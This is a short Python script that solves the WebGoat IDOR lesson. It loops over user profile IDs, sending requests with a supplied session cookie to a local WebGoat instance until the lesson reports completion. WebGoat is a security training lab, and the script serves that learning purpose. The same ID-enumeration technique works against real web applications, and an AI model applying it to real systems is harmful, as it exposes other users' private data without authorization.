import requests
import sys

try:
   #Assign script parameters of variables
   start_userprofile = int(sys.argv[1])
   loopIteration = int(sys.argv[2])
   sessionID = sys.argv[3]

   end_userprofile = start_userprofile + loopIteration
   #Loop through user profiles based on user defined user profile range
   for i in range(start_userprofile,end_userprofile):

     headers = {
		 'Accept': '*/*',
		 'Accept-Encoding':'gzip, deflate, br',
		 'Accept-Language':'en-US,en;q=0.5',
		 'Connection':'keep-alive',
		 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
		 'Cookie':'JSESSIONID='+str(sessionID),
		 'Origin':'http://localhost:8080',
		 'Referer':'http://localhost:8080/WebGoat/start.mvc',
		 'Sec-Fetch-Dest':'empty',
		 'Sec-Fetch-Mode':'cors',
		 'Sec-Fetch-Site':'same-origin',
		 'User-Agent':'any',
		 'X-Requested-With':'XMLHttpRequest',
      }
     #Send get request
     response = requests.get('http://localhost:8080/WebGoat/IDOR/profile/'+str(i),timeout=5, headers=headers)
     data = response.json()
     print(data)
     #Solution found, break from loop and end execution
     if data['lessonCompleted']:
       break

except Exception as error:
  print("An exception occured:", error)
